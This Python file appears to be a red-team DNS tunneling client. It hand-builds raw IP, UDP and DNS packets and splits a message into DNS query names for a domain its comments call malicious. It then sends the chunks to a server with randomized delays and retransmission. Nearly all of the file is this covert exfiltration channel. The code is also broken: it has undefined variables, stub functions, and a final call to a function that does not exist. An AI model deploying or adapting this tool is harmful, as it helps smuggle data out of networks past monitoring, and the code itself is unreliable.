from dnstun import dns_query_create, dns_header_create, udp_header_create, ip_header_create

from random import randint, uniform
from math import ceil
from socket import socket, inet_aton, AF_INET, SOCK_RAW, SOCK_DGRAM, IPPROTO_RAW, IPPROTO_IP, IP_HDRINCL, SOL_SOCKET, SO_REUSEADDR
from time import sleep
from threading import Thread, Lock, Condition

sock=socket(AF_INET , SOCK_RAW, IPPROTO_RAW)    #create a raw socket
rsock=socket(AF_INET, SOCK_RAW, 17)             #create a udp raw socket
sock.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)      #enable IP_HDRINCL

sock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)    #allow multiple bindings to port(only use for udp)
rsock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)   #allow multiple bindings to port(only use for udp)

activeIDs=[]
idLock=Lock()


def genID(packetNum: int):
    safeID=False
    idLock.acquire()
    while True:
        id=randint(0, 65535-packetNum)  #craft id and leave enough space so it can be incremented for the len of the message | also see: rfc1982
        idMax=id+packetNum
        if not activeIDs:               #no active ids, continue 
            break
        for i in activeIDs:             #iterate through tuples of min max active ids
            if i[0] <= id <= i[1] and i[0] <= idMax <= i[1]:      #check our id range does not conflict
                continue                                          #if they do continue looping
            else:                                                 #if they dont break out of loops
                safeID=True
                break 
        if safeID:               #break out of while loop
            break
    activeIDs.append((id,idMax)) #add active ID to list
    idLock.release()
    return id

def connectionWait(src :str, src_port :int, dst :str, dst_port :int, domain :str):
    while True:
        id=genID(1)
        domain_ByAr = bytearray()                        #Byte array for the domain in the qname
        packet=bytearray()
        messageLen=len(message)
        
        for i in domain_split:
            domain_ByAr += len(i).to_bytes(1, byteorder="big")
            domain_ByAr += bytearray(i, 'idna')

        packet=dns_query_create(message, domain_ByAr)  #craft query with tunnneled data
        
        packet=dns_header_create(id,'0', '0000')+packet                         #create the dns header
        
        length=len(packet)+8                                                        #calc length, 8=UDP header length
        Bsport = src_port.to_bytes(2, byteorder="big")                              #convert source port to bytes
        Bdport = dst_port.to_bytes(2, byteorder="big")                              #convert destination port to bytes
        packet=udp_header_create(Bsport, Bdport, length)+packet                     #create the udp header
        
        length += 20                                                                #calc length, 20=IP header length
        Bsrc = inet_aton(src)                                                       #convert source ip to bytes
        Bdst = inet_aton(dst)                                                       #convert destination ip to bytes 
        packet=ip_header_create(Bsrc, Bdst, length)+packet                          #create the ip header


        rsock.settimeout(45.0)
        while True:
            sock.sendto(packet, (dst, dst_port))                                        #send the packet to the server
            bufferSize = 255  #max message size
            try:
                receivedPacket=rsock.recvfrom(bufferSize)   #listen for messages
            except (TimeoutError):
                break
            except (OSError):
                pass
            else:
                if receivedPacket[0][9:10]==b'\x11' and receivedPacket[1][0]==dst and\
                receivedPacket[0][udp_base:udp_base+2]==dst_port.to_bytes(2, byteorder="big") and\
                receivedPacket[0][udp_base+8:udp_base+10]==id:
                    message=extractMessage(receivedPacket,)
                    cLock.acquire()
                    cache = list(filter(lambda i: i!=int.from_bytes(packet[0][udp_base+8:udp_base+10], "big"), cache))
                    cLock.release()
                    sleep(uniform(3,10))                                                     #wait 3.00-10.00 sec till next connnection
                    break

def extractMessage(receivedPacket: tuple):
    return 0

def recv():
    return 0

def send(src :str, src_port :int, dst :str, dst_port :int, domain :str, message :str):
    global activeIDs
    cLock=Lock()
    tLock=Condition()
    domain_split=domain.split('.')                      #split up the string malicous domain
    cache=[]
    query_len = 253 - len(domain_split)*63              #calculate remaining space for tunnneled data    
    messageLen=len(message)
    packetNum=ceil((messageLen/query_len))
    id=genID(packetNum)
    def send_packets(id: int, message :str):
        nonlocal cache
        domain_ByAr = bytearray()                        #Byte array for the domain in the qname
        packet=bytearray()
        messageLen=len(message)
        
        for i in domain_split:
            domain_ByAr += len(i).to_bytes(1, byteorder="big")
            domain_ByAr += bytearray(i, 'idna')

        j=1
        while -1*query_len <messageLen-query_len*j:
            packet=dns_query_create(message[query_len*(j-1):query_len*j], domain_ByAr)  #craft query with tunnneled data
            
            packet=dns_header_create(id+j-1,'0', '0000')+packet                         #create the dns header
            
            length=len(packet)+8                                                        #calc length, 8=UDP header length
            Bsport = src_port.to_bytes(2, byteorder="big")                              #convert source port to bytes
            Bdport = dst_port.to_bytes(2, byteorder="big")                              #convert destination port to bytes
            packet=udp_header_create(Bsport, Bdport, length)+packet                     #create the udp header
            
            length += 20                                                                #calc length, 20=IP header length
            Bsrc = inet_aton(src)                                                       #convert source ip to bytes
            Bdst = inet_aton(dst)                                                       #convert destination ip to bytes 
            packet=ip_header_create(Bsrc, Bdst, length)+packet                          #create the ip header
            with tLock:
                if not cache: cache.append(id+j-1); tLock.notify_all();                 #add to cache and let threads start
                else: cache.append(id+j-1)                                              #normal add to cache
            sock.sendto(packet, (dst, dst_port))                                        #send the packet to the server
            j+=1
            
    def receive_replys():
        rsock.bind((src, src_port))
        rsock.settimeout(5.0)
        with tLock:    
            tLock.wait()
        while(cache != [] or not messagesent):      #loop as long as some messages have not received a response
            bufferSize = 255  #max message size
            try:
                packet=rsock.recvfrom(bufferSize)   #listen for messages
            except (TimeoutError):
                break
            except (OSError):
                pass
            else:
                Thread(target=process_replys, args=(packet,)).start()        #create the reply processing thread
        
    def process_replys(packet :tuple,):
            nonlocal cache
            p=(packet[0][0:1])                  #get ip header length
            udp_base=((p[0] & 0xF) * 4)         #calc to offset to the end of the ip header
            #if udp msg, server ip and port then,
            if packet[0][9:10]==b'\x11' and packet[1][0]==dst and packet[0][udp_base:udp_base+2]==dst_port.to_bytes(2, byteorder="big"):
                cLock.acquire()
                cache = list(filter(lambda i: i!=int.from_bytes(packet[0][udp_base+8:udp_base+10], "big"), cache))
                cLock.release()
                
    def caching():
        nonlocal cache
        with tLock:          #wait for the cache to have data
            tLock.wait()
        for i in range(9):   #sleep for 45 sec (intial re-transmission period) 
            if cache == []:  #able to short circuit wait every 5 sec
                break
            sleep(5)  
        while(cache != []):       #loop while the cache is not empty
            cLock.acquire()
            cacheIntialLen=len(cache)
            i=0
            while i<=cacheIntialLen:
                cachedID=cache.pop(0)
                message_part=message[query_len*(cachedID-id):query_len*(cachedID-id+1)]
                send_packets(cachedID, message_part)
                i+=1
            cLock.release()
            for i in range(9):      #sleep for 45 sec (retransmission period)
                if cache == []:     #able to short circuit wait every 5 sec
                    break
                sleep(5)  
    
    cThread = Thread(target=caching, args=())           #create the cache thread 
    rThread = Thread(target=receive_replys, args=())    #create the reply listener thread
    cThread.start()                                  #start the cache thread
    rThread.start()                                  #start the reply listener thread
    sock.bind((src, src_port))                       #bind socket to a port
    messagesent=False
    send_packets(id, message)
    messagesent=True
    cThread.join()                                   #hold program for the cache thread
    rThread.join()                                   #hold program for the reply listener thread
    sock.close()
    idLock.acquire()
    activeIDs = list(filter(lambda i: i[0]!=id, activeIDs)) #remove ID from active ids
    idLock.release()

send_message("127.0.0.1", 1337, "127.0.0.1", 53, "red.team", "test data")